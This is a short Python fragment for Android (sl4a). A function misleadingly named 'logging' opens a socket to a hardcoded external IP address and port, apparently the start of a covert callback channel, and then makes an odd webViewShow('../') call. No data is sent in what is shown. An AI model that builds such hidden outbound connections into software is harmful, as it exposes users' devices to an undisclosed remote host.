import socket, sl4a 

def logging():
    host = '37.191.195.168'
    port = 60002
    droid = sl4a.Android()
    s = socket.socket()
    s.connect((host,port))
    droid.webViewShow('../')
